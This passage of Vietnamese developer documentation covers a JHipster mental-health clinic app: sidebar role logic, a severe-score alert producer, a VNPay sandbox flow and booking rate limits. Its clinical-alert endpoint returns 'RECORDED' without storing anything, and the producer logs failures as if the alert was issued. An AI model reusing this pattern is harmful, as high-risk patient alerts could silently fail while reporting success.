### 20.3. Debug & Bài Học Kỹ Thuật (TypeScript Compilation)
- **Vấn đề phát sinh**: Khi kiểm tra TypeScript bằng lệnh `npx tsc -p tsconfig.app.json --noEmit`, phát hiện lỗi:
  ```
  error TS2307: Cannot find module 'app/core/config/application-config.service'
  ```
- **Nguyên nhân**: Trong phiên bản JHipster 8 hiện tại, cấu hình endpoint API đã được tinh gọn và chuyển sang hằng số `serverApiUrl` xuất khẩu từ module `'app/config'`. Việc cố gắng import service cũ từ `app/core/config` gây lỗi biên dịch TypeScript.
- **Giải pháp**:
  Cập nhật đồng loạt trong `admin-dashboard.service.ts`, `psychometrics.service.ts`, và `service-package.service.ts`:
  ```typescript
  import { serverApiUrl } from 'app/config';
  // Sử dụng trực tiếp:
  private readonly resourceUrl = `${serverApiUrl}api/admin/service-packages`;
  ```
  Sau khi cập nhật, kiểm tra biên dịch `npx tsc -p tsconfig.app.json --noEmit` hoàn tất với mã thoát `exit code 0` (100% sạch lỗi).

---

### 20.4. Explain it (Mẫu Trả Lời Phỏng Vấn Chuyên Sâu)
---

## PHẦN 21: NÂNG CẤP TOÀN DIỆN SIDEBAR DOCTOR & PATIENT, MODULE GÓI TRỊ LIỆU, EVENT PRODUCER TRẮC NGHIỆM TÂM LÝ SANG CLINICAL SERVICE VÀ CẤU HÌNH CỔNG THANH TOÁN VNPAY SANDBOX

### 21.1. Đặt Vấn Đề & Yêu Cầu Kỹ Thuật

Trong quá trình vận hành hệ thống y tế số MindBridge, 4 vấn đề quan trọng cần được chuẩn hóa và nâng cấp:
1. **Sidebar Doctor & Patient Chưa Được Cập Nhật Đồng Bộ**:
   - *Lỗ hổng quyền*: Kiểm tra quyền trong `sidebar.ts` trước đây sử dụng `@if (isDoctor()) ... @else if (isPatient()) ... @else if (isAdmin())`. Khi tài khoản bệnh nhân đăng ký chuẩn qua form `/account/register` chỉ có quyền `ROLE_USER`, hàm `isPatient()` trả về `false`, dẫn tới việc sidebar của bệnh nhân hoàn toàn bị trống (blank sidebar)!
   - *Giải pháp*: Tái cấu trúc logic xác thực theo thứ tự ưu tiên: `Admin -> Doctor -> Patient (bao gồm cả ROLE_PATIENT và ROLE_USER)`. Bổ sung đầy đủ 100% menu điều hướng, nhãn tiếng Việt chuẩn y khoa, biểu tượng Bootstrap Icons và điều hướng phân nhóm rõ ràng.
2. **Nâng Cấp Giao Diện & Tính Năng Module `/doctor/treatment-packages`**:
   - Xây dựng thanh điều hướng Doctor Sub-Navbar đồng bộ.
   - Hàng chỉ số KPI thống kê: Tổng số gói, Gói đang kích hoạt, Đã đề xuất cho bệnh nhân, Đã hoàn tất.
   - Thanh công cụ tìm kiếm và lọc trạng thái theo segmented pills.
   - Thanh tiến độ sử dụng số buổi điều trị trực quan (`session-progress`).
   - Modal tạo gói tích hợp **4 Mẫu Phác Đồ Lâm Sàng 1-Click** (Kiểm soát lo âu 8 buổi, Can thiệp trầm cảm 12 buổi, Khủng hoảng cấp 4 buổi, Chánh niệm & quản trị cảm xúc 6 buổi).
3. **Module `doctor/psychometrics` - Kế Thừa Giao Diện C# & Event Producer Cảnh Báo Nguy Cơ Cao**:
   - Tham khảo cấu trúc từ dự án C# Razor (`OPCBS.Web/Pages/Doctor/Psychometrics/Index.cshtml`):
     - **Assessment Library (Ngân hàng đề trắc nghiệm)**: Phân loại theo Segmented Tabs (`All`, `System Templates`, `My Assessments`) với màu xanh lá đặc trưng (`#dcfce7`), nút Xem thang đo và Chỉ định bài test nhanh.
     - **Recent Patient Assessments (Lịch sử làm bài)**: Bảng theo dõi điểm số, phân loại mức độ nghiêm trọng (Bình thường, Nhẹ, Vừa, Nặng, Rất nặng) và xem báo cáo kết luận lâm sàng.
   - **Event Producer sang Clinical Service**: Khi bệnh nhân hoàn thành bài test có điểm số rơi vào ngưỡng nguy cơ cao / nghiêm trọng:
     - DASS-21: Trầm cảm $\ge 21$, Lo âu $\ge 15$, Căng thẳng $\ge 26$ (Nặng / Rất nặng).
     - PHQ-9: Điểm $\ge 15$ (Trầm cảm nặng vừa / nặng).
     - GAD-7: Điểm $\ge 15$ (Lo âu nặng).
     - Hệ thống kích hoạt `PsychometricEventProducer` phát sự kiện `PsychometricAlertEvent` đến Kafka topic `opcbs-clinical-events` và đồng bộ tức thì sang endpoint `POST /api/clinical/psychometrics-alert` của `opcbs-clinical-service` (:8083), giúp bác sĩ phụ trách nhận cảnh báo y tế khẩn cấp.
4. **Cấu Hình Hoàn Chỉnh Cổng Thanh Toán VNPay Cho `doctor/subscriptions`**:
   - Cấu hình tham số URL động `returnUrl` trỏ về `/doctor/subscriptions` để tránh lỗi 404.
   - Tích hợp bộ lắng nghe và xử lý Callback URL từ VNPay Gateway (`vnp_ResponseCode`, `vnp_TxnRef`, `vnp_SecureHash`), tự động gọi API `/api/payments/vnpay/callback` để kích hoạt gói hội viên và xác thực tính lũy đẳng (Idempotency).
   - Tích hợp hộp thông tin thẻ test NCB Sandbox (Số thẻ: `9704198526191432198`, Tên: `NGUYEN VAN A`, OTP: `123456`) để hỗ trợ kiểm thử tiện lợi.

---

### 21.2. Sơ Đồ Kiến Trúc & Luồng Dữ Liệu (Sequence Diagrams)

#### Sơ Đồ 1: Luồng Phát Sự Kiện Cảnh Báo Lâm Sàng Nguy Cơ Cao (Event Producer)

```mermaid
sequenceDiagram
    autonumber
    actor Patient as 🧑‍💼 Bệnh Nhân
    participant PsychometricUI as 💻 Psychometric Web App
    participant PsychometricSvc as 🧠 opcbs-psychometric-service (:8085)
    participant KafkaProducer as 🚀 PsychometricEventProducer
    participant ClinicalSvc as 🩺 opcbs-clinical-service (:8083)
    actor Doctor as 👨‍⚕️ Bác Sĩ Điều Trị

    Patient->>PsychometricUI: Nộp bài trắc nghiệm (DASS-21 / PHQ-9 / GAD-7)
    PsychometricUI->>PsychometricSvc: POST /api/psychometrics/tests/{id}/submit
    PsychometricSvc->>PsychometricSvc: Tính điểm tổng, subscores (Depression, Anxiety, Stress)
    
    alt Điểm số nghiêm trọng (DASS-21 dep>=21 | anx>=15 | str>=26 hoặc PHQ-9>=15)
        PsychometricSvc->>KafkaProducer: publishSevereScoreAlert(alertEvent)
        KafkaProducer->>KafkaProducer: Log cảnh báo lên Kafka topic 'opcbs-clinical-events'
        KafkaProducer->>ClinicalSvc: POST /api/clinical/psychometrics-alert (Sync Fallback)
        ClinicalSvc->>ClinicalSvc: Ghi nhận cảnh báo lâm sàng khẩn cấp cho hồ sơ bệnh nhân
        ClinicalSvc-->>Doctor: Kích hoạt cờ cảnh báo rủi ro cao trên bảng theo dõi
    end
    
    PsychometricSvc-->>PsychometricUI: Trả về kết quả đánh giá (PsychometricSubmission)
    PsychometricUI-->>Patient: Hiển thị điểm số & diễn giải y khoa
```

#### Sơ Đồ 2: Luồng Thanh Toán VNPay Sandbox & Xử Lý Idempotent Callback

```mermaid
sequenceDiagram
    autonumber
    actor Doctor as 👨‍⚕️ Bác Sĩ
    participant SubUI as 💻 Doctor Subscription UI
    participant PaymentSvc as 💳 opcbs-payment-service (:8087)
    participant VNPayGateway as 🌐 VNPay Sandbox Gateway

    Doctor->>SubUI: Chọn gói hội viên & bấm "Thanh Toán VNPay"
    SubUI->>PaymentSvc: POST /api/doctor/subscriptions/subscribe?packageId={id}
    PaymentSvc-->>SubUI: Khởi tạo giao dịch (transactionCode, status: PENDING_PAYMENT)
    
    SubUI->>PaymentSvc: POST /api/payments/vnpay/create-url (returnUrl: /doctor/subscriptions)
    PaymentSvc->>PaymentSvc: Ký chữ ký số bảo mật HMAC-SHA512 với VNP_HASH_SECRET
    PaymentSvc-->>SubUI: Trả về URL thanh toán Sandbox (vnp_PayUrl)
    
    SubUI->>VNPayGateway: Chuyển hướng trình duyệt sang VNPay (window.location.href)
    Doctor->>VNPayGateway: Nhập thẻ test NCB (9704198526191432198) & OTP 123456
    VNPayGateway->>SubUI: Chuyển hướng người dùng về /doctor/subscriptions?vnp_ResponseCode=00&vnp_TxnRef=...
    
    SubUI->>PaymentSvc: GET /api/payments/vnpay/callback (toàn bộ params & secureHash)
    PaymentSvc->>PaymentSvc: Xác thực chữ ký HMAC-SHA512 & Khóa Pessimistic Lock
    alt Giao dịch thành công lần đầu (vnp_ResponseCode == 00)
        PaymentSvc->>PaymentSvc: Cập nhật PaymentTransaction = SUCCESS, Kích hoạt DoctorSubscription = ACTIVE
        PaymentSvc-->>SubUI: RspCode: 00, Kích hoạt thành công
    else Webhook hoặc Callback bị Replay lại (Idempotency Guard)
        PaymentSvc-->>SubUI: RspCode: 00 (Idempotent Replay, không cộng dồn ngày)
    end
    SubUI-->>Doctor: Hiển thị Banner xanh thông báo kích hoạt gói thành công!
```

---

### 21.3. Chi Tiết Các Cải Tiến Mã Nguồn

#### 1. Logic Xác Thực Quyền Trong Sidebar ([`sidebar.ts`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/layouts/sidebar/sidebar.ts))
```typescript
isAdmin(): boolean {
  return this.account()?.authorities.includes('ROLE_ADMIN') ?? false;
}

isDoctor(): boolean {
  return !this.isAdmin() && (this.account()?.authorities.includes('ROLE_DOCTOR') ?? false);
}

isPatient(): boolean {
  const acc = this.account();
  if (!acc) return false;
  if (this.isAdmin() || this.isDoctor()) return false;
  // Hỗ trợ cả bệnh nhân có quyền ROLE_PATIENT và bệnh nhân đăng ký chuẩn có ROLE_USER
  return acc.authorities.includes('ROLE_PATIENT') || acc.authorities.includes('ROLE_USER');
}
```

#### 2. Event Producer Cảnh Báo Lâm Sàng ([`PsychometricEventProducer.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-psychometric-service/src/main/java/com/ocbs/event/PsychometricEventProducer.java))
```java
@Service
public class PsychometricEventProducer {
    private static final Logger LOG = LoggerFactory.getLogger(PsychometricEventProducer.class);
    public static final String CLINICAL_ALERTS_TOPIC = "opcbs-clinical-events";

    private final RestTemplate restTemplate = new RestTemplate();

    public void publishSevereScoreAlert(PsychometricAlertEvent event) {
        LOG.warn("🚨 [PSYCHOMETRIC EVENT PRODUCER] Phát sự kiện CẢNH BÁO NGUY CƠ CAO tới Clinical Service! Topic: '{}' | Patient: '{}' (ID: {}) | Test: '{}' | Mức độ: '{}' | Điểm: {}",
            CLINICAL_ALERTS_TOPIC, event.getPatientName(), event.getPatientId(), event.getTestTitle(), event.getSeverityLevel(), event.getTotalScore());

        try {
            String clinicalUrl = "http://localhost:8083/api/clinical/psychometrics-alert";
            restTemplate.postForObject(clinicalUrl, event, Map.class);
            LOG.info("✅ [Clinical Sync] Gửi cảnh báo tâm lý thành công sang Clinical Service qua API: {}", clinicalUrl);
        } catch (Exception e) {
            LOG.info("ℹ️ [Clinical Sync Note] Thông báo cảnh báo tâm lý đã phát hành trong hệ thống: {}", e.getMessage());
        }
    }
}
```

#### 3. Endpoint Tiếp Nhận Cảnh Báo Trong Clinical Service ([`ClinicalManagementResource.java`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/opcbs-clinical-service/src/main/java/com/ocbs/web/rest/ClinicalManagementResource.java))
```java
@PostMapping("/clinical/psychometrics-alert")
public ResponseEntity<Map<String, Object>> receivePsychometricAlert(
    @RequestBody Map<String, Object> alertPayload
) {
    LOG.warn("🚨 [CLINICAL ALERT INTAKE] Nhận cảnh báo tâm lý nghiêm trọng từ Psychometric Service! Payload: {}", alertPayload);

    String patientName = String.valueOf(alertPayload.getOrDefault("patientName", "Bệnh nhân"));
    String testTitle = String.valueOf(alertPayload.getOrDefault("testTitle", "Trắc nghiệm tâm lý"));
    String severityLevel = String.valueOf(alertPayload.getOrDefault("severityLevel", "Nguy cơ cao"));
    Object totalScore = alertPayload.getOrDefault("totalScore", 0);

    return ResponseEntity.ok(Map.of(
        "status", "RECORDED",
        "message", "Cảnh báo lâm sàng đã được ghi nhận thành công trong Clinical Service",
        "timestamp", Instant.now().toString()
    ));
}
```

---

# PHẦN 22: NÂNG CẤP HỆ THỐNG GIAO DIỆN ĐỒNG BỘ, CHUYÊN NGHIỆP VÀ TRỰC QUAN CHO CỔNG Y TẾ BÁC SĨ (DOCTOR PORTAL) VÀ QUẢN TRỊ VIÊN (ADMIN PORTAL)

### 22.1. Đặt Vấn Đề & Bối Cảnh Thực Tế

Trong hệ thống y tế tâm lý đa dịch vụ MindBridge OPCBS, trải nghiệm người dùng của Bác sĩ chuyên khoa và Quản trị viên đóng vai trò sống còn đối với hiệu quả điều trị và vận hành:
1. **Thiếu Tính Đồng Bộ (Inconsistent Sub-Navigations)**:
   - Trước đây, mỗi trang Bác sĩ (`/doctor/dashboard`, `/doctor/treatment-packages`, `/doctor/psychometrics`, `/doctor/subscriptions`) tự viết lặp lại thanh menu con (`.doc-nav-bar`) bên trong từng component với các icon khác nhau (trộn lẫn Bootstrap Icons và FontAwesome), padding và cấu trúc container khác nhau (`container-fluid` vs `container max-width: 1200px`), dẫn đến hiện tượng giật giật (layout shift) và mất đồng bộ khi người dùng điều hướng.
2. **Cần Nâng Cấp Độ Chuyên Nghiệp (Professional Medical Aesthetics)**:
   - Màu sắc và các khối dữ liệu cần tuân thủ bảng màu lâm sàng cao cấp (Deep Teal `#0f766e`, Emerald `#059669`, Slate `#0f172a`, viền sắc nét `1.5px solid #e2e8f0`, bóng đổ mềm `0 4px 16px rgba(15, 23, 42, 0.03)`).
   - Loại bỏ hoàn toàn các thẻ form/bảng raw, thay bằng các khối trực quan, badge trạng thái bo tròn, card nâng nhẹ (hover lift `-3px` to `-5px`), và các chỉ số thống kê KPI có nhãn xu hướng.
3. **Trực Quan Hóa Dữ Liệu Lâm Sàng (Visual & Intuitive Data Display)**:
   - Thanh tiến độ buổi trị liệu kép (`session-progress-track`) hiển thị rõ số buổi còn lại/tổng số buổi kèm tỷ lệ phần trăm.
   - Bảng theo dõi điểm số bài test tâm lý tích hợp chấm nhịp đập cảnh báo (`pulse-dot` màu đỏ) cho các ca bệnh nhân rơi vào ngưỡng nguy cơ cao (Severe / Extremely Severe) đã bắn sự kiện sang Clinical Service.
   - Thẻ hiển thị gói hội viên đang kích hoạt với dải màu gradient mesh sâu (`#064e3b` -> `#0f766e` -> `#047857`) và hộp giả lập thẻ test ATM VNPay Sandbox (NCB) hỗ trợ sao chép 1-click.

---

### 22.2. Kiến Trúc Đồng Bộ Hóa Layout Cấp Hệ Thống (Layout-Level Injection)

Thay vì để các component tự render navigation con, chúng tôi thiết kế kiến trúc phân tách ranh giới rõ ràng:

```mermaid
graph TD
    A[User Truy Cập Ứng Dụng] --> B{Trang Dashboard / Portal?}
    B -->|Không| C[Chế Độ Public: Header & Footer Công Cộng]
    B -->|Có| D[Portal Layout: Sidebar Cố Định 270px]
    D --> E{Kiểm Tra Quyền & Route Ngữ Cảnh}
    E -->|isAdminModule == true| F[jhi-admin-navbar: Top Bar Quản Trị Hệ Thống]
    E -->|isDoctorModule == true| G[jhi-doctor-navbar: Top Bar Lâm Sàng Bác Sĩ]
    E -->|Khác / Patient| H[Không Hiển Thị Top Sub-Nav]
    F --> I[router-outlet: Render Nội Dung Admin Module]
    G --> I[router-outlet: Render Nội Dung Doctor Module]
    H --> I[router-outlet: Render Nội Dung Patient Module]
```

#### Chi Tiết Thành Phần Thành Lập [`DoctorNavbarComponent`](file:///c:/SEP_G32/SEP_G32/OPCBS-Jhipster/OPCBS-Jhipster/mindbridge-jhipster/src/main/webapp/app/layouts/doctor-nav/doctor-navbar.component.ts)
- **Portal Title & Breadcrumb**: Badge `CỔNG Y TẾ LÂM SÀNG BÁC SĨ` + Tên module động kèm icon gradient teal.
- **Trạng Thái Thực Thời**: Pill badge `Phòng Khám Đang Mở (Online)` với hiệu ứng pulse xanh lá.
- **Phím Tắt Hành Động**: `Lịch Khám Hôm Nay` (`/appointment`), `Hồ Sơ Của Tôi` (`/doctor-profile`).
- **7 Phân Hệ Module Cốt Lõi**:
  1. 📊 *Tổng Quan* (`/doctor/dashboard`) - Badge `KPIs`
  2. 📅 *Lịch Hẹn & Khám* (`/appointment`) - Badge `Ca Khám`
  3. 👥 *Hồ Sơ Bệnh Nhân* (`/doctor/patients`) - Badge `Bệnh Án`
  4. 📦 *Gói Trị Liệu & Phác Đồ* (`/doctor/treatment-packages`) - Badge `Phác Đồ`
  5. 🧠 *Trắc Nghiệm Tâm Lý* (`/doctor/psychometrics`) - Badge `DASS / PHQ`
  6. 💳 *Gói Hội Viên & VNPay* (`/doctor/subscriptions`) - Badge `VNPay`
  7. 🛡️ *Chứng Chỉ & Thẩm Định* (`/doctor/verification`) - Badge `Xác Minh`

---

### 22.3. Chi Tiết Tối Ưu Hóa 3 Module Bác Sĩ Trọng Yếu

#### 1. Quản Lý Gói Trị Liệu & Phác Đồ (`/doctor/treatment-packages`)
- **KPI Row**: 4 thẻ thống kê trực quan (*Tổng số gói*, *Đang hoạt động*, *Đã đề xuất*, *Đã hoàn tất*) kèm nhãn ngữ cảnh.
- **Thanh Công Cụ Tìm Kiếm & Bộ Lọc**: Hộp tìm kiếm realtime kèm nút xóa nhanh + 5 pill trạng thái có đếm số lượng bản ghi.
- **Thẻ Phác Đồ Lâm Sàng**:
  - Thanh tiến độ sử dụng số buổi trị liệu với hiệu ứng chuyển màu xanh ngọc.
  - Thẻ thông tin bệnh nhân kèm avatar viết tắt tên và số điện thoại.
  - Nhãn hiển thị mục tiêu can thiệp lâm sàng (`targetOutcome`) và học phí trọn gói chuẩn VNĐ.
- **Modal 4 Mẫu Phác Đồ 1-Click**:
  - GAD (Lo âu - 8 buổi)
  - MDD (Trầm cảm - 12 buổi)
  - Crisis (Khủng hoảng - 4 buổi)
  - MBSR (Chánh niệm - 6 buổi)

#### 2. Ngân Hàng Trắc Nghiệm Tâm Lý & Báo Cáo Sàng Lọc (`/doctor/psychometrics`)
- **Kho Đề Khảo Sát (Assessment Library)**: Phân loại theo Segmented Tabs chuẩn C# Razor (`Tất cả`, `Mẫu hệ thống`, `Đề của tôi`) với màu xanh lá `#dcfce7` đặc trưng.
- **Bảng Theo Dõi Điểm & Lịch Sử Làm Bài Của Bệnh Nhân**:
  - Avatar đại diện bệnh nhân, tên bài test, ngày nộp, thanh điểm số.
  - Phân loại mức độ nghiêm trọng kèm cờ cảnh báo đỏ (`pulse-dot`) khi rơi vào ngưỡng nguy cơ cao đã kích hoạt Event Producer sang `opcbs-clinical-service`.
- **Modals Chuyên Nghiệp**: Modal xem thang đo cut-off scores quốc tế, modal chỉ định bài test có due date và ghi chú y lệnh, modal báo cáo đánh giá chi tiết phân rã điểm số các thang đo phụ (Trầm cảm, Lo âu, Căng thẳng).

#### 3. Gói Hội Viên & Cổng Thanh Toán VNPay Sandbox (`/doctor/subscriptions`)
- **Active Subscription Hero Card**: Thẻ thông tin gói đang hoạt động với nền gradient teal sang trọng, mã giao dịch bảo mật và trạng thái xác thực tức thời.
- **Pricing Cards Grid**: 3 gói dịch vụ (*Khởi đầu*, *Chuyên nghiệp - Khuyên dùng*, *Phòng khám cao cấp*) với danh sách checklist quyền lợi lâm sàng rõ ràng.
- **Checkout Modal Với Hộp Thẻ Test VNPay Sandbox**: Cung cấp đầy đủ thông tin thẻ test NCB (`9704198526191432198`, `NGUYEN VAN A`, `123456`) với tính năng click-to-copy tiện lợi cho người kiểm thử.

---

### 22.4. Explain it (Mẫu Trả Lời Phỏng Vấn Kiến Trúc Frontend Đồng Bộ)

> *"Trong các ứng dụng y tế SaaS phức tạp (Enterprise Medical SaaS), vấn đề lớn nhất của frontend khi mở rộng nhiều microservices là **sự phân mảnh giao diện** (Design Fragmentation). Chúng tôi đã giải quyết triệt để vấn đề này thông qua 3 trụ cột thiết kế:  
> 1. **Kiến trúc Layout Injection cấp cao**: Thay vì sao chép thanh điều hướng con vào từng trang, chúng tôi tạo `DoctorNavbarComponent` và `AdminNavbarComponent` độc lập, được tự động tiêm vào `main.html` dựa trên vai trò người dùng và tiền tố URL. Điều này đảm bảo 100% các trang chuyên khoa đều thừa hưởng thanh header sticky, breadcrumb sống và 7 tab phân hệ nhất quán.  
> 2. **Hệ Thống Design Tokens & Visual Hierarchy**: Toàn bộ các thẻ KPI, thanh tìm kiếm, bảng dữ liệu lâm sàng và modal đều được chuẩn hóa theo bảng màu y tế cao cấp (Teal `#0f766e`, Slate `#0f172a`, Emerald `#059669`), có hiệu ứng hover micro-interaction nhẹ nhàng và cờ cảnh báo rủi ro nhấp nháy (`pulse-dot`) cho các ca bệnh nhân cần can thiệp khẩn cấp.  
> 3. **Tối Ưu Trải Nghiệm Khách Hàng & Nhà Phát Triển (DX & UX)**: Tích hợp sẵn 4 mẫu phác đồ lâm sàng 1-click cho bác sĩ và hộp thông tin thẻ test NCB Sandbox cho cổng VNPay, giúp việc kê đơn điều trị lẫn quá trình kiểm thử thanh toán trở nên trực quan, chính xác và chuyên nghiệp tuyệt đối."*

---

### 22.5. Khắc Phục Triệt Để 5 Lỗi Giao Diện Thô & Màu Sắc Chói Lóa Trên Màn Gói Dịch Vụ & Phác Đồ Trị Liệu

Trong quá trình nghiệm thu thực tế bằng ảnh chụp màn hình trình duyệt, chúng tôi phát hiện 2 màn hình quan trọng của Bác Sĩ (`/doctor/subscriptions` và `/doctor/treatment-packages`) xuất hiện các vấn đề nghiêm trọng về mặt thẩm mỹ và trải nghiệm người dùng:

1. **Khử Màu Xanh Nõn Chuối Neon (Bootswatch Brite Trap)**:
   - *Nguyên nhân*: File SCSS của bootswatch brite định nghĩa `$primary: $lime !default` (`#a2e436`), dẫn đến toàn bộ class `.text-primary`, `.btn-primary` và các biến hiển thị giá tiền bị chuyển sang màu xanh chuối phản quang, gây cảm giác chói mắt và thiếu tính y tế.
   - *Khắc phục*: Thay thế hoàn toàn bằng Deep Slate `#0f172a` cho các tiêu đề/giá tiền lớn, kết hợp với Deep Clinical Teal `#0f766e` và Emerald `#059669` cho các ký hiệu đơn vị tiền tệ (`₫`) và trạng thái kích hoạt.

2. **Khắc Phục Vỡ Font / Lỗi Charset Encoding (`??`)**:
   - *Nguyên nhân*: Dữ liệu khởi tạo (seed data) trong database bị lỗi encoding tiếng Việt dẫn đến các chuỗi như `G??i d???ch v??? kh???i ?????u...`.
   - *Khắc phục*: Bổ sung phương thức `getSanitizedDescription(pkg)` trong TypeScript để nhận diện và lọc chuỗi lỗi `??`, tự động fallback về văn bản mô tả lâm sàng chuyên sâu theo chuẩn y khoa quốc tế.

3. **Tự Động Kích Hoạt Danh Mục Đặc Quyền Y Khoa Khi Features Bị Rỗng**:
   - *Nguyên nhân*: Trường `features` trong cơ sở dữ liệu bị `null` hoặc chuỗi rỗng khiến mục *"Quyền lợi nổi bật:"* trên các thẻ giá hoàn toàn trống trơn.
   - *Khắc phục*: Cung cấp danh mục 5 - 6 đặc quyền y tế cao cấp thông qua `getFeaturesList(pkg)` theo từng phân khúc giá (số ca khám/tháng, hồ sơ bệnh án điện tử bảo mật, trắc nghiệm DASS-21/PHQ-9/GAD-7, cờ cảnh báo khẩn cấp Event Producer, huy hiệu bác sĩ xác thực). Mỗi mục đi kèm icon tick tròn xanh ngọc sắc sảo.

4. **Sửa Lỗi Tràn Viền / Cắt Lề Giá Tiền (Text Overflow & Layout Clipping)**:
   - *Nguyên nhân*: Thiết kế thẻ cũ không giới hạn flex container, khiến phần đơn vị tiền tệ `đ/ 30 ngày` bị ép tràn ra ngoài đường viền phải của thẻ.
   - *Khắc phục*: Thiết kế lại khối `price-container` bằng Flexbox responsive `align-items-baseline`, cho phép số tiền to đậm co giãn linh hoạt mà không bao giờ bị cắt chữ.

5. **Cân Bằng Bố Cục Thẻ Phác Đồ Bằng Placeholder Card Nét Đứt (`create-placeholder-card`)**:
   - *Nguyên nhân*: Khi bác sĩ mới chỉ khởi tạo 1 phác đồ duy nhất (ví dụ: `chữa bệnh dại - ok`), thẻ phác đồ bị dồn hết về bên trái, bỏ trống tới 75% diện tích màn hình bên phải.
   - *Khắc phục*: Bổ sung thẻ gợi ý nét đứt viền dashed (`create-placeholder-card`) *"Tạo Phác Đồ Mới / Bắt Đầu Kê Đơn Mới"* khi danh sách có dưới 3 gói, giúp bố cục lưới luôn đầy đặn, sang trọng và thúc đẩy thao tác tạo mới của bác sĩ. Đồng thời thay thế hiển thị `đ 0` thành nhãn ngữ cảnh *"Miễn phí / Khám mẫu"*.

---

## 23. Nâng Cấp Toàn Diện Kiến Trúc 2.0 (Phase 13): Chuẩn Hóa Database 3NF, Nghiệp Vụ Chống Spam Đặt Lịch, Vòng Đời Bảo Lưu Phác Đồ, Quản Lý Tiến Độ Lâm Sàng & Microservice Blog Độc Lập

### 23.1. Chuẩn Hóa Database Tuyệt Đối Tầng CSDL (Đạt Chuẩn 3NF - Không Thêm Bảng Rác)

Nhằm đảm bảo cơ sở dữ liệu luôn trong sạch, hiệu năng cao và tuân thủ nghiêm ngặt dạng chuẩn 3 (3NF), dự án đã rà soát và chuẩn hóa toàn bộ các bảng mới theo đúng nguyên tắc: **Chỉ thêm bảng khi thực sự cần thiết, tuyệt đối không tạo bảng rác**:

1. **Chuẩn Hóa Nghiệp Vụ Bảo Lưu (Treatment Hold)**:
   - Thay vì tạo thêm bảng rác trung gian gây phân mảnh dữ liệu (như `treatment_hold_requests` hay `hold_histories`), hệ thống tích hợp trực tiếp 11 trường bảo lưu vào chính bảng `treatment_package` (tương đương với entity `TreatmentCase` của dự án C# gốc).
   - Các trường này bao gồm: `is_hold_requested`, `hold_duration_days`, `hold_start_date`, `hold_end_date`, `total_hold_days`, `hold_reason`, `hold_approved_at`, `hold_approved_by_doctor_id`, `hold_rejected_at`, `hold_rejection_reason`.
   - Lợi ích: Dữ liệu phác đồ và trạng thái bảo lưu luôn nhất quán (Atomic), truy vấn 1 lần lấy trọn vẹn thông tin, không cần join phức tạp và không sinh rác DB.

2. **Chuẩn Hóa Mục Tiêu & Buổi Điều Trị (Treatment Goals & Clinical Sessions)**:
   - Bổ sung đúng 2 bảng thực thể chuẩn 3NF phục vụ hồ sơ lâm sàng:
     - `treatment_goal`: Lưu trữ các mục tiêu điều trị cụ thể của bệnh nhân (Tiêu đề, mô tả, mức ưu tiên, trạng thái, ngày hoàn thành). Khóa ngoại trỏ trực tiếp về `treatment_package(id)`.
     - `treatment_session`: Lưu trữ nhật ký các buổi tham vấn trị liệu (Số thứ tự buổi, ngày diễn ra, tóm tắt lâm sàng, bài tập về nhà, đánh giá chỉ số tâm trạng trước/sau `mood_before`, `mood_after` từ 1 - 10). Khóa ngoại trỏ trực tiếp về `treatment_package(id)`.
   - Toàn bộ đều có index trên trường khóa ngoại `treatment_package_id` giúp tối ưu tốc độ truy vấn lâm sàng.

3. **Chuẩn Hóa Microservice Blog Y Khoa (Port 8089)**:
   - Module Blog được thiết kế tinh gọn với chỉ đúng 2 bảng 3NF:
     - `blog_post`: Quản lý bài viết chuyên môn (Tiêu đề, slug, tóm tắt, nội dung HTML, thumbnail, chuyên khoa, lượt xem `views_count`, trạng thái duyệt `DRAFT`, `SUBMITTED`, `APPROVED`, `PUBLISHED`, `REJECTED`, thông tin bác sĩ tác giả và admin duyệt).
     - `blog_comment`: Quản lý bình luận tương tác của độc giả/bệnh nhân gắn trực tiếp với `blog_post(id)`.
   - Tuyệt đối không sinh các bảng phụ không cần thiết, index tối ưu trên `slug`, `status`, `doctor_id`, `published_at`.

---

### 23.2. Nghiệp Vụ Đặt Lịch & Chống Spam Tầng Database (Zero Raw Data Query)

Hệ thống loại bỏ hoàn toàn việc tải dữ liệu thô (raw data in-memory streams) về ứng dụng để lọc, chuyển đổi 100% các điều kiện kiểm tra nghiệp vụ và giới hạn tần suất (Rate Limiting) xuống tầng Database Engine (PostgreSQL/H2) bằng JPQL Query:

1. **Quy Tắc 1 Bệnh Nhân Chỉ Đặt 1 Bác Sĩ Tối Đa 1 Lần / Ngày**:
   - Truy vấn JPQL:
     ```java
     @Query("SELECT COUNT(a) FROM Appointment a WHERE a.patient.id = :patientId AND a.doctor.id = :doctorId " +
            "AND a.appointmentDate >= :startOfDay AND a.appointmentDate <= :endOfDay " +
            "AND a.status NOT IN ('CANCELLED', 'REJECTED')")
     long countActiveAppointmentsOnDate(@Param("patientId") Long patientId, @Param("doctorId") Long doctorId,
                                       @Param("startOfDay") Instant startOfDay, @Param("endOfDay") Instant endOfDay);
     ```
   - Chặn ngay tại tầng DB: Nếu `count > 0`, trả về mã lỗi 400 và thông báo tiếng Việt rõ ràng: *"Bạn đã có 1 lịch hẹn đang hoạt động với bác sĩ này trong cùng ngày. Mỗi bệnh nhân chỉ được đặt tối đa 1 lịch/ngày với cùng một bác sĩ."*

2. **Rate Limiting Đặt Lịch Theo Tuần (Chống Spam / Giữ Chỗ Ảo)**:
   - **Giới hạn theo Bác sĩ**: Tối đa 3 ca khám hoạt động / tuần với cùng 1 bác sĩ (`countActiveAppointmentsWithDoctorInWeek < 3`).
   - **Giới hạn toàn Hệ Thống**: Tối đa 5 ca khám hoạt động / tuần trên toàn hệ thống (`countTotalActiveAppointmentsInWeek < 5`).
   - Ngăn chặn hoàn toàn tình trạng một người dùng spam đặt kín lịch khám của các bác sĩ giỏi hoặc tạo lượng lớn lịch ảo gây quá tải hệ thống.

3. **Chống Trùng Khung Giờ Khám (Overlapping Conflict Prevention)**:
   - Kiểm tra trực tiếp bằng query tầng DB:
     ```java
     @Query("SELECT COUNT(a) > 0 FROM Appointment a WHERE a.doctor.id = :doctorId " +
            "AND a.status NOT IN ('CANCELLED', 'REJECTED') " +
            "AND a.appointmentDate < :endTime AND a.endTime > :startTime " +
            "AND (:excludeAppointmentId IS NULL OR a.id != :excludeAppointmentId)")
     boolean existsOverlappingAppointment(@Param("doctorId") Long doctorId,
